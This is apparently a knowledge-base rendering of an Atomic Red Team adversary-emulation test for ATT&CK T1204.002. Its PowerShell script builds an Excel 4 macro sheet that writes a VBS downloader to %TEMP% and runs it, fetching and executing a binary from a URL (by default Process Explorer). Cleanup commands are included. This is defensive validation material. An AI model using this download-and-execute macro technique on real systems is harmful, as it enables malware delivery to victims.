---
atomic_guid: "4ea1fc97-8a46-4b4e-ba48-af43d2a98052"
title: "Excel 4 Macro"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "4ea1fc97-8a46-4b4e-ba48-af43d2a98052"
  - "Excel 4 Macro"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Excel 4 Macro

This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.

A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
you'd like to utilize the "=GET.WORKSPACE(26)" method, that many maldoc authors use, you will need to ensure that the User Name associated
with Excel matches that of the local system. This username can be found under Files -> Options -> Username

## Metadata

- Atomic GUID: 4ea1fc97-8a46-4b4e-ba48-af43d2a98052
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### download_url

- description: Download URL
- type: string
- default: https://live.sysinternals.com/procexp.exe

### uname

- description: Username for pathing
- type: string
- default: $env:Username

## Dependencies

Microsoft Excel must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "Excel.Application" | Out-Null
  Stop-Process -Name "Excel"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
$fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
$fname1 = "$env:TEMP\procexp.exe"
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject "Excel.Application"
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if ("#{uname}" -ne "") {
  $sheet.Cells.Item(1,1) = "#{uname}"
} else {
  $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
}

$sheet.Cells.Item(2,1) = "procexp.exe"
$sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
$sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
$sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
$sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"
$sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
$sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
$sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
$sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
$sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
$sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
$sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
$sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
$sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
$sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
$sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
$sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
$sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
$sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
$sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
$sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
$sheet.Cells.Item(23,1) = "=HALT()"
$sheet.Cells.Item(1,1).Name = "runme"
$xlApp.Run("runme")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp
```

### Cleanup

```powershell
Stop-Process -Name "procexp*" -ErrorAction Ignore
Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
